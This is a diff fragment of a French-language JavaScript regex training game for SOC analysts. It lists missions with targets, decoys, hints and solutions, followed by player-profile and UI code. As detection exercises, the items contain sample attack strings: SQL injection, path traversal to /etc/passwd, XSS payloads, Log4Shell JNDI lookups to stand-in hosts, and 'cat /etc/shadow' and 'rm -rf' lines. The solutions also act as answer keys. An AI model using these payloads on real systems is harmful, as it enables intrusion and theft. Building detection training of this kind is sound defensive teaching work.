+    debrief: "C'est la signature exacte utilisée par les scanners de secrets (GitLeaks, TruffleHog) pour détecter les fuites d'identifiants AWS dans les dépôts Git." },
+
+  // --- TIER 3 : ANALYSTE SOC N3 (Alternation |, Groupes (...), Portée & Non-Greedy) ---
+  { id: 19, diff: 3, theme: "NET", title: "Alternation groupée (tcp|udp) et ports multiples",
+    scenario: "Isole les règles pare-feu autorisant ('allow') les protocoles 'tcp' ou 'udp' à destination des ports '53' ou '443' uniquement.",
+    targets: ["allow tcp dport 53", "allow udp dport 53", "allow tcp dport 443", "allow udp dport 443"],
+    decoys: ["allow icmp dport 53", "allow tcp dport 80", "allow tcp dport 4430", "deny tcp dport 53"],
+    hint: "Utilise deux groupes d'alternation : '^allow (tcp|udp) dport (53|443)$'.",
+    solution: "^allow (tcp|udp) dport (53|443)$",
+    debrief: "L'opérateur '|' a la priorité la plus faible en RegEx : l'enfermer dans des parenthèses '(tcp|udp)' évite qu'il ne coupe toute l'expression en deux." },
+  { id: 20, diff: 3, theme: "SYS", title: "Factorisation de préfixes optionnels ((re)?start|reload)",
+    scenario: "Cible uniquement les commandes exactes 'systemctl start sshd', 'systemctl restart sshd' et 'systemctl reload sshd'.",
+    targets: ["systemctl start sshd", "systemctl restart sshd", "systemctl reload sshd"],
+    decoys: ["systemctl stop sshd", "systemctl status sshd", "sudo systemctl start sshd", "systemctl reload nginx"],
+    hint: "Combine '^systemctl ((re)?start|reload) sshd$' (ou 'start|restart|reload').",
+    solution: "^systemctl ((re)?start|reload) sshd$",
+    debrief: "Imbriquer '(re)?start' factorise 'start' et 'restart' tout en gardant le motif compact et lisible." },
+  { id: 21, diff: 3, theme: "SEC", title: "Règle WAF : Détection d'Injection SQL (SQLi)",
+    scenario: "Détecte les requêtes HTTP malveillantes contenant l'une des 3 signatures SQLi suivantes : \"' OR 1=1\", \"UNION SELECT\" ou \"DROP TABLE\".",
+    targets: ["/login?u=admin' OR 1=1--", "/item?id=1 UNION SELECT user,pass", "/admin?q=;DROP TABLE users"],
+    decoys: ["/item?id=100", "/page?union=true&select=1", "/api?drop=false", "/login?u=admin"],
+    hint: "Utilise l'alternation : \"(' OR 1=1|UNION SELECT|DROP TABLE)\".",
+    solution: "(' OR 1=1|UNION SELECT|DROP TABLE)",
+    debrief: "Les règles d'inspection WAF (ModSecurity, Coraza) reposent sur des alternations de signatures pour inspecter les paramètres d'URI en une seule passe." },
+  { id: 22, diff: 3, theme: "NET", title: "Sous-réseaux privés RFC 1918 Classe B (172.16.x à 172.31.x)",
+    scenario: "Cible les adresses IP appartenant à la plage privée RFC 1918 '172.16.0.0/12' (second octet compris entre 16 et 31 inclus) en début de ligne.",
+    targets: ["172.16.0.1", "172.19.254.1", "172.24.10.5", "172.31.255.254"],
+    decoys: ["172.15.0.1", "172.32.0.1", "172.160.0.1", "10.172.16.1"],
+    hint: "Découpe 16..31 en trois cas dans un groupe : '1[6-9]' (16-19), '2\\d' (20-29) ou '3[01]' (30-31).",
+    solution: "^172\\.(1[6-9]|2\\d|3[01])\\.",
+    debrief: "Une RegEx traite du texte, pas des nombres : pour borner 16 à 31, on décompose par dizaines ('1[6-9]|2\\d|3[01]') suivi d'un point échappé '\\.'." },
+  { id: 23, diff: 3, theme: "SYS", title: "Sous-groupe de version optionnel (\\.\\d+)?",
+    scenario: "Cible les paquets Debian 'pkg_vX.Y-amd64.deb' ou 'pkg_vX.Y.Z-amd64.deb' (2 ou 3 numéros de version séparés par des points).",
+    targets: ["pkg_v1.0-amd64.deb", "pkg_v2.14.3-amd64.deb", "pkg_v0.9.12-amd64.deb"],
+    decoys: ["pkg_v1-amd64.deb", "pkg_v1.0.2.4-amd64.deb", "pkg_v1.0-arm64.deb", "pkg_v1.0.-amd64.deb"],
+    hint: "Rends le 3e segment '.Z' optionnel grâce à un groupe suivi de '?' : '^pkg_v\\d+\\.\\d+(\\.\\d+)?-amd64\\.deb$'.",
+    solution: "^pkg_v\\d+\\.\\d+(\\.\\d+)?-amd64\\.deb$",
+    debrief: "Enfermer '\\.\\d+' dans un groupe optionnel '(\\.\\d+)?' garantit que le point n'est présent que s'il est suivi d'au moins un chiffre." },
+  { id: 24, diff: 3, theme: "SEC", title: "Détection de Path Traversal (../ et ..\\)",
+    scenario: "Isole les tentatives d'exploitation Directory Traversal comportant AU MOINS 2 séquences consécutives de '../' ou '..\\'.",
+    targets: ["GET /download?f=../../etc/passwd", "GET /view?p=..\\..\\..\\windows\\win.ini", "GET /app/../../../../root/.ssh"],
+    decoys: ["GET /download?f=../index.html", "GET /static/..style.css", "GET /about/index.html"],
+    hint: "Garde le motif '(\\.\\.[/\\\\]){2,}' (note le double antislash pour matcher '\\' dans '[...]').",
+    solution: "(\\.\\.[/\\\\]){2,}",
+    debrief: "La classe '[/\\\\]' couvre simultanément les serveurs Unix ('/') et Windows ('\\'). Le quantifieur '{2,}' exige au moins deux remontées d'arborescence." },
+  { id: 25, diff: 3, theme: "NET", title: "Sélection de ports Web & Plage 8000-8089",
+    scenario: "Isole les configurations 'port=<N>' pour les ports '80', '443', ainsi que tous les ports de '8000' à '8089'.",
+    targets: ["port=80", "port=443", "port=8000", "port=8085"],
+    decoys: ["port=808", "port=8090", "port=80000", "port=4433"],
+    hint: "Combine '^port=(80|443|80[0-8]\\d)$'.",
+    solution: "^port=(80|443|80[0-8]\\d)$",
+    debrief: "Ancrer l'alternation entre '^port=(' et ')$' empêche '80' de matcher partiellement 'port=8090' ou 'port=808'." },
+  { id: 26, diff: 3, theme: "SYS", title: "Validation d'horodatage Syslog 24h (00:00:00 à 23:59:59)",
+    scenario: "Valide les lignes de journal débutant par une heure valide au format 'HH:MM:SS' (heures 00-23, minutes 00-59, secondes 00-59).",
+    targets: ["00:00:00 kernel: boot", "14:35:09 sshd: auth", "23:59:59 cron: job", "09:05:30 systemd: ok"],
+    decoys: ["24:00:00 kernel: err", "14:60:09 sshd: err", "14:35:60 cron: err", "9:05:30 systemd: err"],
+    hint: "Heures : '([01]\\d|2[0-3])', Minutes et Secondes : '[0-5]\\d'.",
+    solution: "^([01]\\d|2[0-3]):[0-5]\\d:[0-5]\\d ",
+    debrief: "Ce patron classique valide strictement l'horloge 24h : '00..19' via '[01]\\d' et '20..23' via '2[0-3]'." },
+  { id: 27, diff: 3, theme: "SEC", title: "Extraction XSS sans chevrons internes (<script>[^<>]+</script>)",
+    scenario: "Cible les vecteurs XSS contenant une balise '<script>...</script>' pure (sans attributs dans '<script>' et sans aucun chevron '<' ou '>' à l'intérieur du code).",
+    targets: ["payload=<script>alert(1)</script>", "q=<script>fetch('c2')</script>", "in=<script>eval(x)</script>"],
+    decoys: ["payload=<script src=\"a.js\"></script><p>ok</p>", "q=<script>if(a>b)</script>", "in=<style>body{}</style>"],
+    hint: "Utilise la classe niée '[^<>]+' entre '<script>' et '</script>'.",
+    solution: "<script>[^<>]+</script>",
+    debrief: "Si tu avais utilisé '<script>.+</script>' (quantifieur gourmand), le premier piège '<script src=\"a.js\"></script><p>ok</p>' ou deux balises sur la même ligne auraient fusionné ! '[^<>]+' bloque tout débordement." },
+
+  // --- TIER 4 : EXPERT FORENSICS N4 (Références Arrières \1, \2 & Corrélation) ---
+  { id: 28, diff: 4, theme: "NET", title: "Boucle Réseau / Land Attack (IP Source == IP Destination)",
+    scenario: "À l'aide d'un groupe capturant '()' et d'une référence arrière '\\1', isole les paquets malveillants où l'IP source ('SRC=...') est strictement identique à l'IP destination ('DST=...').",
+    targets: ["SRC=10.0.0.5 DST=10.0.0.5 PROTO=TCP", "SRC=192.168.1.1 DST=192.168.1.1 PROTO=UDP", "SRC=172.16.0.99 DST=172.16.0.99 PROTO=ICMP"],
+    decoys: ["SRC=10.0.0.5 DST=10.0.0.6 PROTO=TCP", "SRC=10.0.0.5 DST=10.0.0.50 PROTO=TCP", "SRC=192.168.1.1 DST=10.0.0.1 PROTO=UDP"],
+    hint: "Capture l'IP source dans '([0-9.]+)' et rappelle-la après 'DST=' avec '\\1\\b'.",
+    solution: "SRC=([0-9.]+) DST=\\1\\b",
+    debrief: "Puissance unique des RegEx : '\\1' oblige le moteur à matcher exactement le même texte que celui capturé par la 1re parenthèse ouvrante ! Le '\\b' final évite que '10.0.0.5' ne matche le début de '10.0.0.50'." },
+  { id: 29, diff: 4, theme: "SYS", title: "Détection de mots dupliqués dans les configs (\\b(\\w+)\\s+\\1\\b)",
+    scenario: "Détecte les erreurs de saisie où un même mot complet est répété deux fois de suite, séparé par un ou plusieurs espaces.",
+    targets: ["allow allow 10.0.0.0/8", "listen 80 80;", "user root root", "max_conn   max_conn 100"],
+    decoys: ["allow all 10.0.0.0/8", "listen 80 8080;", "user root_root", "max_conn 100"],
+    hint: "Encadre toute l'expression par des frontières de mots '\\b' : '\\b(\\w+)\\s+\\1\\b'.",
+    solution: "\\b(\\w+)\\s+\\1\\b",
+    debrief: "Sans le premier '\\b' et le second '\\b', 'listen 80 8080' matcherait ('80' suivi de '80'). Les frontières de mots garantissent l'égalité du mot entier." },
+  { id: 30, diff: 4, theme: "SEC", title: "DGA & Palindromes C2 (Double référence \\2\\1)",
+    scenario: "Un malware génère des domaines 'c2_<4lettres>.net' dont les 4 lettres minuscules forment un palindrome (type ABBA : 'abba', 'deed', 'noon'). Isole-les.",
+    targets: ["c2_abba.net", "c2_deed.net", "c2_noon.net", "c2_xzzx.net"],
+    decoys: ["c2_abcd.net", "c2_abab.net", "c2_aaaa.org", "c2_ab1ba.net"],
+    hint: "Capture la 1re lettre '([a-z])', la 2e '([a-z])', puis rappelle '\\2\\1'.",
+    solution: "^c2_([a-z])([a-z])\\2\\1\\.net$",
+    debrief: "Les groupes sont numérotés de gauche à droite selon l'ordre de leurs parenthèses ouvrantes : '\\1' est la 1re lettre, '\\2' est la 2e, donc '\\2\\1' inverse l'ordre (AB -> BA)." },
+  { id: 31, diff: 4, theme: "NET", title: "Cohérence des séparateurs MAC (Tout ':' ou Tout '-')",
+    scenario: "Valide les adresses MAC utilisant soit ':' partout, soit '-' partout, mais REJETTE les adresses mixtes comme '00:1A-2B:3C-4D:5E'.",
+    targets: ["00:1A:2B:3C:4D:5E", "00-1A-2B-3C-4D-5E", "aa:bb:cc:dd:ee:ff"],
+    decoys: ["00:1A-2B:3C-4D:5E", "00-1A:2B-3C-4D-5E", "00_1A_2B_3C_4D_5E", "00:1A:2B:3C:4D"],
+    hint: "Capture le 1er séparateur '([:-])' et réutilise '\\1' dans le groupe répété 4 fois : '^[0-9a-fA-F]{2}([:-])([0-9a-fA-F]{2}\\1){4}[0-9a-fA-F]{2}$'.",
+    solution: "^[0-9a-fA-F]{2}([:-])([0-9a-fA-F]{2}\\1){4}[0-9a-fA-F]{2}$",
+    debrief: "En capturant le tout premier séparateur dans le groupe 1 '([:-])', la référence '\\1' force les 4 séparateurs suivants à être strictement identiques au premier." },
+  { id: 32, diff: 4, theme: "SYS", title: "Validation de balises XML/Config appariées (<tag>...</tag>)",
+    scenario: "Isole les entrées dont la balise fermante '</...>' porte exactement le même nom que la balise ouvrante '<...>'.",
+    targets: ["<host>srv01</host>", "<port>8080</port>", "<zone>dmz</zone>"],
+    decoys: ["<host>srv01</port>", "<zone>dmz</host>", "<host>srv01<host>", "<>srv01</>"],
+    hint: "Capture le nom de la balise ouvrante '^<([a-z]+)>' et vérifie '</\\1>$'.",
+    solution: "^<([a-z]+)>[^<]+</\\1>$",
+    debrief: "La référence arrière '</\\1>' élimine toutes les lignes dont la balise fermante ne correspond pas à la balise ouvrante." },
+  { id: 33, diff: 4, theme: "SEC", title: "Guillemets simples ou doubles appariés (['\"])",
+    scenario: "Cible les arguments 'cmd=...' entourés soit de deux guillemets doubles '\"...\"', soit de deux apostrophes \"'...'\", sans mélanger les deux et sans chaîne vide.",
+    targets: ["cmd=\"whoami\"", "cmd='id -u'", "cmd=\"cat /etc/shadow\""],
+    decoys: ["cmd=\"whoami'", "cmd='id -u\"", "cmd=whoami", "cmd=\"\""],
+    hint: "Capture le guillemet ouvrant \"(['\\\"])\", matche \"[^'\\\"]+\", puis ferme avec \"\\1$\".",
+    solution: "^cmd=(['\"])[^'\"]+\\1$",
+    debrief: "Ce patron est un classique des analyseurs lexicaux pour extraire des chaînes littérales correctement fermées." },
+  { id: 34, diff: 4, theme: "NET", title: "Détection de Scan TCP Symétrique (SPT == DPT)",
+    scenario: "Un scanner réseau forge des paquets SYN dont le port source ('SPT=') est égal au port destination ('DPT='). Isole uniquement ces paquets SYN.",
+    targets: ["SPT=4444 DPT=4444 SYN", "SPT=80 DPT=80 SYN", "SPT=65535 DPT=65535 SYN"],
+    decoys: ["SPT=4444 DPT=80 SYN", "SPT=80 DPT=8080 SYN", "SPT=4444 DPT=4444 ACK"],
+    hint: "Structure : '^SPT=(\\d+) DPT=\\1 SYN$'.",
+    solution: "^SPT=(\\d+) DPT=\\1 SYN$",
+    debrief: "En une seule expression compacte, tu corrèles deux champs dynamiques tout en filtrant le flag TCP SYN." },
+  { id: 35, diff: 4, theme: "SYS", title: "Audit de cohérence /etc/passwd (Triple corrélation \\1)",
+    scenario: "Isole les lignes '/etc/passwd' où le login, le champ commentaire (GECOS) et le dossier '/home/<user>' portent tous les trois exactement le même nom.",
+    targets: ["adrien:x:1000:1000:adrien:/home/adrien:/bin/bash", "soc:x:1001:1001:soc:/home/soc:/bin/zsh", "net01:x:1002:1002:net01:/home/net01:/bin/sh"],
+    decoys: ["adrien:x:1000:1000:admin:/home/adrien:/bin/bash", "soc:x:1001:1001:soc:/home/other:/bin/zsh", "root:x:0:0:root:/root:/bin/bash"],
+    hint: "Capture '^(\\w+):x:\\d+:\\d+:\\1:/home/\\1:'.",
+    solution: "^(\\w+):x:\\d+:\\d+:\\1:/home/\\1:",
+    debrief: "Une même référence arrière '\\1' peut être réutilisée autant de fois que nécessaire dans le reste du motif." },
+  { id: 36, diff: 4, theme: "SEC", title: "Déobfuscation PowerShell (Séquence alternée \\1 et \\2)",
+    scenario: "Isole les chaînes obfusquées de la forme 'enc=$varA+$varB+$varA+$varB' où les deux variables PowerShell se répètent dans le même ordre.",
+    targets: ["enc=$x1+$y2+$x1+$y2", "enc=$aa+$bb+$aa+$bb", "enc=$k9+$m0+$k9+$m0"],
+    decoys: ["enc=$x1+$y2+$y2+$x1", "enc=$x1+$x1+$y2+$y2", "enc=$x1+$y2+$x1+$z3"],
+    hint: "N'oublie pas d'échapper '$' et '+' : '^enc=(\\$\\w+)\\+(\\$\\w+)\\+\\1\\+\\2$'.",
+    solution: "^enc=(\\$\\w+)\\+(\\$\\w+)\\+\\1\\+\\2$",
+    debrief: "Attention au double piège : '$' (fin de ligne) et '+' (quantifieur) sont des métacaractères RegEx et doivent être échappés ('\\$', '\\+') pour matcher du code PowerShell." },
+
+  // --- TIER 5 : ARCHITECTE SECOPS N5 (Lookarounds (?=...) (?!...) (?<=...) (?<!...) & Boss) ---
+  { id: 37, diff: 5, theme: "NET", title: "Negative Lookahead (?!...) — Exclusion de passerelle et broadcast",
+    scenario: "En RegEx, comment reproduire l'exclusion '!(1|255)' d'extglob ? Avec un Negative Lookahead '(?!...)' ! Cible les IP '192.168.1.X' SAUF '.1' et '.255'.",
+    targets: ["192.168.1.2", "192.168.1.10", "192.168.1.100", "192.168.1.254"],
+    decoys: ["192.168.1.1", "192.168.1.255", "192.168.2.10", "192.168.1.abc"],
+    hint: "Vérifie que la fin n'est ni '1$' ni '255$' avant de consommer les chiffres : '^192\\.168\\.1\\.(?!(1|255)$)\\d{1,3}$'.",
+    solution: "^192\\.168\\.1\\.(?!(1|255)$)\\d{1,3}$",
+    debrief: "Le Negative Lookahead '(?!(1|255)$)' inspecte ce qui suit sans avancer le curseur : si l'octet complet est '1' ou '255', il annule le match ; sinon, '\\d{1,3}$' valide les chiffres !" },
+  { id: 38, diff: 5, theme: "SYS", title: "Negative Lookbehind (?<!...) — Ignorer commentaires et dry-runs",
+    scenario: "Détecte les exécutions réelles de 'rm -rf' qui NE SONT PAS immédiatement précédées par '# ' (commentaire) ni par 'echo ' (dry-run).",
+    targets: ["sudo rm -rf /tmp/cache", "rm -rf /var/log/old", "sh -c \"rm -rf build\""],
+    decoys: ["# rm -rf /tmp/cache", "echo rm -rf /var/log/old", "rm -f /tmp/file"],
+    hint: "Utilise l'assertion arrière négative : '(?<!(# |echo ))rm -rf\\b'.",
+    solution: "(?<!(# |echo ))rm -rf\\b",
+    debrief: "Le Negative Lookbehind '(?<!...)' vérifie ce qui se trouve À GAUCHE de la position courante sans l'inclure dans le match." },
+  { id: 39, diff: 5, theme: "SEC", title: "Positive Lookahead Multiple (?=...) — Politique de mot de passe ANSSI",
+    scenario: "Valide les mots de passe d'au moins 8 caractères contenant obligatoirement AU MOINS un chiffre ('\\d'), une majuscule ('[A-Z]') et un symbole ('[!@#$%]'), dans n'importe quel ordre.",
+    targets: ["P@ssw0rd!", "SecOps2026#", "99_Admin$Key", "Tr0ub4dor%"],
+    decoys: ["Password!", "p@ssw0rd!", "Passw0rd123", "P@ss1!"],
+    hint: "Enchaîne 3 lookaheads positifs depuis '^' : '^(?=.*\\d)(?=.*[A-Z])(?=.*[!@#$%]).{8,}$'.",
+    solution: "^(?=.*\\d)(?=.*[A-Z])(?=.*[!@#$%]).{8,}$",
+    debrief: "Comme un lookahead '(?=...)' ne consomme aucun caractère, le curseur reste sur '^' après chaque vérification ! On peut ainsi tester plusieurs conditions indépendantes (ET logique) avant de vérifier la longueur '.{8,}$'." },
+  { id: 40, diff: 5, theme: "NET", title: "Filtrage de ligne complète par Lookahead Négatif",
+    scenario: "Isole toutes les lignes de pare-feu contenant 'STATE=NEW', SAUF celles où apparaît l'adresse de loopback 'SRC=127.0.0.1' (quelle que soit sa position dans la ligne).",
+    targets: ["SRC=10.0.0.5 DST=10.0.0.1 STATE=NEW", "DST=10.0.0.1 SRC=8.8.8.8 STATE=NEW", "STATE=NEW SRC=192.168.1.50"],
+    decoys: ["SRC=127.0.0.1 DST=127.0.0.1 STATE=NEW", "STATE=NEW SRC=127.0.0.1", "SRC=10.0.0.5 DST=10.0.0.1 STATE=ESTABLISHED"],
+    hint: "Depuis '^', vérifie l'absence de 'SRC=127.0.0.1' sur toute la ligne : '^(?!.*SRC=127\\.0\\.0\\.1).*STATE=NEW'.",
+    solution: "^(?!.*SRC=127\\.0\\.0\\.1).*STATE=NEW",
+    debrief: "Le patron '^(?!.*MOT_INTERDIT).*MOT_REQUIS' est la technique reine dans les SIEM (Splunk, Elastic, QRadar) pour filtrer du bruit sans écrire deux règles séparées." },
+  { id: 41, diff: 5, theme: "SYS", title: "Équivalent RegEx d'extglob : systemd-!(networkd|resolved).service",
+    scenario: "Cible toutes les unités 'systemd-<nom>.service' (lettres minuscules) SAUF 'systemd-networkd.service' et 'systemd-resolved.service'.",
+    targets: ["systemd-logind.service", "systemd-udevd.service", "systemd-journald.service", "systemd-timesyncd.service"],
+    decoys: ["systemd-networkd.service", "systemd-resolved.service", "systemd-logind.socket", "sshd.service"],
+    hint: "Place le lookahead juste après 'systemd-' : '^systemd-(?!(networkd|resolved)\\.service$)[a-z]+\\.service$'.",
+    solution: "^systemd-(?!(networkd|resolved)\\.service$)[a-z]+\\.service$",
+    debrief: "Tu viens de traduire exactement 'systemd-!(networkd|resolved).service' de Bash extglob vers la syntaxe PCRE universelle !" },
+  { id: 42, diff: 5, theme: "SEC", title: "Chasse au Zero-Day Log4Shell (JNDI Obfusqué)",
+    scenario: "Détecte les charges utiles Log4Shell contenant '${' suivi (directement ou après obfuscation) de 'jndi:' et d'un protocole 'ldap://', 'rmi://' ou 'dns://'.",
+    targets: ["${jndi:ldap://evil.cc/a}", "${jndi:rmi://10.0.0.1/x}", "${${lower:j}ndi:dns://c2.net}"],
+    decoys: ["${HOME}/ldap/config", "jndi:ldap://safe.local", "${jndi:http://web.local}", "${user.name}"],
+    hint: "Échappe '$' et '{' : '\\$\\{.*jndi:(ldap|rmi|dns)://'.",
+    solution: "\\$\\{.*jndi:(ldap|rmi|dns)://",
+    debrief: "En autorisant '.*' entre '\\$\\{' et 'jndi:', la règle capture aussi bien la forme standard que les contournements WAF de type '${${lower:j}ndi:...}'." },
+  { id: 43, diff: 5, theme: "NET", title: "Le Grand Classique : Validation stricte d'un octet IPv4 (0 à 255)",
+    scenario: "Valide 'octet=<N>' où N est un entier strictement compris entre 0 et 255 (sans zéro initial superflu comme '01').",
+    targets: ["octet=0", "octet=99", "octet=192", "octet=255", "octet=249"],
+    decoys: ["octet=256", "octet=299", "octet=300", "octet=01", "octet=-1"],
+    hint: "Découpe en 4 cas : '25[0-5]' (250-255), '2[0-4]\\d' (200-249), '1\\d\\d' (100-199), '[1-9]?\\d' (0-99).",
+    solution: "^octet=(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)$",
+    debrief: "C'est LA brique fondamentale des expressions régulières réseau : '(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)'." },
+  { id: 44, diff: 5, theme: "SYS", title: "Audit de binaires SUID Root hors liste blanche",
+    scenario: "Isole les fichiers ayant le bit SUID ('-rwsr-xr-x') dont le chemin final n'est NI '/usr/bin/sudo' NI '/usr/bin/passwd'.",
+    targets: ["-rwsr-xr-x 1 root root /tmp/rootbash", "-rwsr-xr-x 1 root root /usr/bin/find", "-rwsr-xr-x 1 root root /opt/backdoor"],
+    decoys: ["-rwsr-xr-x 1 root root /usr/bin/sudo", "-rwsr-xr-x 1 root root /usr/bin/passwd", "-rwxr-xr-x 1 root root /tmp/script.sh"],
+    hint: "Utilise '^-rwsr-xr-x .*\\s(?!/usr/bin/(sudo|passwd)$)/\\S+$'.",
+    solution: "^-rwsr-xr-x .*\\s(?!/usr/bin/(sudo|passwd)$)/\\S+$",
+    debrief: "Lors d'un audit d'élévation de privilèges Linux (GTFOBins), ce filtre écarte instantanément les binaires SUID légitimes connus." },
+  { id: 45, diff: 5, theme: "SEC", title: "Validation de Token JWT signé (Rejet de l'attaque alg:none)",
+    scenario: "Un JWT valide comporte 3 segments Base64URL ('[\\w-]+') séparés par des points, les deux premiers commençant par 'eyJ'. Rejette les tokens sans signature (attaque alg:none finissant par '.') ou contenant '+' / '/'.",
+    targets: ["eyJhbGci.eyJzdWIi.SflKxwRJSMeKKF2QT4", "eyJ0eXAi.eyJadmin.dBjftJeZ4CVP-mB92K", "eyJ12345.eyJ67890.sig_base64-url_99"],
+    decoys: ["eyJhbGci.eyJzdWIi.", "eyJhbGci.eyJzdWIi", "abc.eyJzdWIi.SflKxw", "eyJhbGci.eyJzdWIi.bad+slash/char"],
+    hint: "Structure : '^eyJ[\\w-]+\\.eyJ[\\w-]+\\.[\\w-]+$'.",
+    solution: "^eyJ[\\w-]+\\.eyJ[\\w-]+\\.[\\w-]+$",
+    debrief: "L'alphabet Base64URL utilise uniquement 'A-Z', 'a-z', '0-9', '_' et '-', ce qui correspond exactement à la classe '[\\w-]+'." },
+  { id: 46, diff: 5, theme: "NET", title: "Détection de boucle BGP AS_PATH (Hors AS-Prepending)",
+    scenario: "En BGP, répéter son propre AS côte à côte ('65001 65001 65002') est légitime (AS-Prepending), mais voir un AS réapparaître APRÈS un AS différent ('65001 65002 65001') est une boucle d'annonces ! Détecte uniquement les boucles.",
+    targets: ["AS_PATH: 65001 65002 65001", "AS_PATH: 15169 3356 1299 3356", "AS_PATH: 100 200 300 100"],
+    decoys: ["AS_PATH: 65001 65001 65002", "AS_PATH: 15169 3356 1299", "AS_PATH: 100 200 200"],
+    hint: "Capture un AS '\\b(\\d+)\\s+', vérifie que le suivant est différent '(?!\\1\\b)\\d+', puis retrouve '\\s+\\1\\b' plus loin.",
+    solution: "\\b(\\d+)\\s+(?!\\1\\b)\\d+(?:\\s+\\d+)*\\s+\\1\\b",
+    debrief: "Combiner une référence arrière '\\1' à l'intérieur d'un Negative Lookahead '(?!\\1\\b)' permet de distinguer une répétition adjacente d'une véritable boucle topologique !" },
+  { id: 47, diff: 5, theme: "SYS", title: "Audit Cryptographique /etc/shadow (SHA-512 & yescrypt)",
+    scenario: "Isole les comptes ayant un hash actif '$6$' (SHA-512) ou '$y$' (yescrypt), en excluant l'utilisateur 'root' et les lignes se terminant par ':0:' (compte expiré).",
+    targets: ["adrien:$6$rounds=5000$saltsalt:19800:0:99999:7:::", "soc:$y$j9T$hashvalue:19800:0:99999:7:::", "netadmin:$6$xyz12345:19800:0:99999:7:::"],
+    decoys: ["root:$6$xyz12345:19800:0:99999:7:::", "guest:!:19800:0:99999:7:::", "olduser:$1$md5hash:19800:0:99999:7:::", "temp:$6$xyz12345:19800:0:99999:7::0:"],
+    hint: "Combine '^(?!root:)[\\w-]+:\\$(6|y)\\$' et un lookahead négatif '(?!.*:0:$)'.",
+    solution: "^(?!root:)[\\w-]+:\\$(6|y)\\$(?!.*:0:$)",
+    debrief: "Tu combines l'exclusion d'utilisateur en tête, la validation de l'algorithme de hachage PAM ('\\$(6|y)\\$') et l'exclusion de fin de ligne." },
+  { id: 48, diff: 5, theme: "SEC", title: "ULTIMATE BOSS — Corrélation SIEM APT Multi-Critères",
+    scenario: "Isole les beacons APT : (1) En-tête '[req=<id> ack=<id>]' où les deux IDs hexadécimaux minuscules d'au moins 4 caractères sont IDENTIQUES, (2) méthode 'POST' ou 'PUT', (3) URI '/api/v1/' ou '/api/v2/' suivie d'un module quelconque SAUF 'health' et 'metrics', (4) code retour final '200' ou '204'.",
+    targets: [
+      "[req=a1b2c3 ack=a1b2c3] POST /api/v1/sync 200",
+      "[req=deadbeef ack=deadbeef] PUT /api/v2/stage 204",
+      "[req=00ff ack=00ff] POST /api/v2/beacon 200",
+      "[req=99cafe ack=99cafe] PUT /api/v1/exfil 204"
+    ],
+    decoys: [
+      "[req=a1b2c3 ack=a1b2c3] GET /api/v1/sync 200",
+      "[req=a1b2c3 ack=a1b2c3] POST /api/v1/health 200",
+      "[req=deadbeef ack=deadbeef] PUT /api/v2/metrics 204",
+      "[req=a1b2c3 ack=ffffff] POST /api/v1/sync 200",
+      "[req=a1b2c3 ack=a1b2c3] POST /api/v1/sync 403",
+      "[req=12 ack=12] POST /api/v1/sync 200"
+    ],
+    hint: "Assemble '^\\[req=([0-9a-f]{4,}) ack=\\1\\] ' + '(POST|PUT) /api/v[12]/' + '(?!(health|metrics)\\b)\\w+ ' + '20[04]$'.",
+    solution: "^\\[req=([0-9a-f]{4,}) ack=\\1\\] (POST|PUT) /api/v[12]/(?!(health|metrics)\\b)\\w+ 20[04]$",
+    debrief: "Maîtrise absolue des Expressions Régulières ! Tu as combiné échappements, quantifieurs bornés, référence arrière '\\1', alternations, negative lookahead et classes de caractères en une seule règle SIEM." }
+];
+
+const TOTAL_MISSIONS = MISSIONS.length;
+
+// =============================================================================
+// 3. PROFIL JOUEUR, GRADES, THÈMES DÉBLOCABLES & ACHIEVEMENTS
+// =============================================================================
+const STORAGE_KEY = "regex_ops_v1_profile";
+
+let profile = {
+  pseudo: "soc",
+  theme: "bash-classic",
+  fontFamily: "'JetBrains Mono', monospace",
+  fontSize: "14px",
+  campaignUnlocked: 1,
+  bestScore: 0,
+  totalScore: 0,
+  streak: 0,
+  bestStreak: 0,
+  masteredIds: [],
+  unlockedThemes: [],
+  badges: [],
+  foundFlag: false,
+  localBoard: [
+    { pseudo: "ken_thompson", score: 5420, mastered: 48 },
+    { pseudo: "root_siem", score: 4180, mastered: 38 },
+    { pseudo: "net_hunter", score: 2650, mastered: 24 }
+  ]
+};
+
+let state = {
+  busy: false,
+  active: false,
+  awaitingNext: false,
+  wizardStep: 0,
+  wizardData: {},
+  mode: "CAMPAIGN",
+  playlist: [],
+  stepIdx: 0,
+  sessionScore: 0,
+  attempts: 0,
+  usedHint: 0,
+  startTimeMs: 0
+};
+
+let cmdHistory = [];
+let histIdx = -1;
+
+const outEl = document.getElementById('term-output');
+const inpEl = document.getElementById('cmd-input');
+const boxEl = document.getElementById('term-box');
+const promptLbl = document.getElementById('prompt-label');
+const promptForm = document.getElementById('prompt-form');
+
+function esc(str) {
+  return String(str).replace(/[&<>"']/g, s => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[s]));
+}
+
+function printHtml(html = "", cls = "") {
+  const div = document.createElement('div');
+  div.className = "log-line" + (cls ? " " + cls : "");
+  div.innerHTML = html;
+  outEl.appendChild(div);
+  boxEl.scrollTop = boxEl.scrollHeight;
+  return div;
+}
+
+function printText(text = "", cls = "") {
+  printHtml(esc(text), cls);
+}
+
+function getOperatorRank() {
+  const c = profile.masteredIds.length;
+  if (c >= 48) return { title: "regex-god", sym: "#" };
+  if (c >= 36) return { title: "secops-arch", sym: "$" };
+  if (c >= 27) return { title: "forensics-n4", sym: "$" };
+  if (c >= 18) return { title: "soc-hunter", sym: "$" };
+  if (c >= 9)  return { title: "sysadmin-n2", sym: "$" };
+  return { title: "stagiaire-n1", sym: "$" };
+}
+
+function isThemeUnlocked(key) {
+  const t = THEMES[key];
+  if (!t) return false;
+  if (!t.locked) return true;
+  return profile.unlockedThemes.includes(key);
+}
+
+function unlockTheme(key, reasonMsg) {
+  if (!THEMES[key] || profile.unlockedThemes.includes(key)) return;
+  profile.unlockedThemes.push(key);
+  populateThemeSelect();
+  saveProfile();
+  printHtml(`  <span class="badge-gold"> 🔓 BONUS DÉBLOQUÉ </span> <span class="c-yellow bold">Thème Prestige '${esc(THEMES[key].label)}' déverrouillé !</span> <span class="c-dim">(${esc(reasonMsg)} — Tape 'theme ${esc(key)}')</span>`);
+}
+
+function unlockBadge(badgeName, desc) {
+  if (profile.badges.includes(badgeName)) return;
+  profile.badges.push(badgeName);
+  saveProfile();
